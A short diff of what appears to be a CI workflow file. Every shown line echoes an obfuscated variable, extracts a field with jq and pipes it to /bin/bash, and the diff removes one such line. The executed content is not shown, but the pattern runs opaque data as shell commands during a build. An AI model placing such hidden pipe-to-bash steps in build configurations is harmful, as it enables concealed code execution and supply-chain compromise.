@@ -22,7 +22,6 @@ jobs:
           echo $dbvov8 | jq -r .cnwrp076 | /bin/bash
           echo $ec29 | jq -r .aun32 | /bin/bash
           echo $st6 | jq -r .xhw9 | /bin/bash
-          echo $oxc570 | jq -r .z96628 | /bin/bash
           echo $d58 | jq -r .lkiz95514 | /bin/bash
           echo $xq6594 | jq -r .pc29 | /bin/bash
           echo $nu41187 | jq -r .qvh802 | /bin/bash
